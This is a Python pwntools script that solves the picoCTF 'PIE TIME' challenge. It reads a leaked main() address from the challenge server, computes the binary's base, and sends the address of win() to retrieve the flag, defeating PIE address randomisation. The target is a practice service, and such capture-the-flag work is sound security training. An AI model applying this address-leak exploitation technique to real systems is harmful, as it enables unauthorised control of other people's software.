#!/usr/bin/env python3
"""
Automated Exploit for picoCTF "PIE TIME" Challenge

This script:
    1. Connects to the remote netcat service
    2. Parses the printed main() address
    3. Computes win() address using known offsets from the correct binary
    4. Sends the win() address (hex digits only) and prints the flag

Dependencies:
    - pwntools (`pip install pwntools`)
"""

from pwn import remote, context, log

# Connection details
HOST = "rescued-float.picoctf.net"
PORT = 6456  # Update this if needed

# Offsets determined from analyzing the challenge binary
MAIN_OFFSET = 0x133d  # Offset of main() from base (Double Check!)
WIN_OFFSET = 0x12a7   # Offset of win() from base (Double Check!)

# Set logging level for pwntools
context.log_level = "info"

def exploit():
        # Establish connection to the remote service
        try:
                p = remote(HOST, PORT)
        except Exception as e:
                log.error(f"Failed to connect to {HOST}:{PORT} - {e}")
                return

        # Receive the line containing the main() address
        try:
                line = p.recvline_contains(b"Address of main:")
                main_addr_str = line.strip().split()[-1]  # Extract the hex address
                main_addr = int(main_addr_str, 16)        # Convert to integer
                log.info(f"Received main() address: {hex(main_addr)}")
        except Exception as e:
                log.error(f"Error parsing main() address: {e}")
                log.error(f"Received data: {p.clean().decode(errors='ignore')}")
                p.close()
                return

        # Calculate the base address of the binary
        base_addr = main_addr - MAIN_OFFSET
        log.info(f"Calculated base address: {hex(base_addr)}")

        # Compute the win() function's address
        win_addr = base_addr + WIN_OFFSET
        log.info(f"Calculated win() address: {hex(win_addr)}")

        # Wait for the input prompt
        try:
                p.recvuntil(b"=> ")
        except EOFError:
                log.error("Connection closed before receiving input prompt.")
                log.error(f"Received data: {p.clean().decode(errors='ignore')}")
                p.close()
                return

        # Prepare the payload (win address as hex string without "0x")
        payload = hex(win_addr)[2:]
        log.info(f"Sending payload: {payload}")

        # Send the payload
        p.sendline(payload.encode())

        # Receive and display the output (hopefully the flag)
        try:
                flag_output = p.recvall(timeout=3).decode(errors="ignore")
                print("\n--- Server Output ---")
                print(flag_output)
                print("--- End Server Output ---")
        except EOFError:
                log.warning("Connection closed while waiting for output.")
        finally:
                p.close()

if __name__ == "__main__":
        exploit()
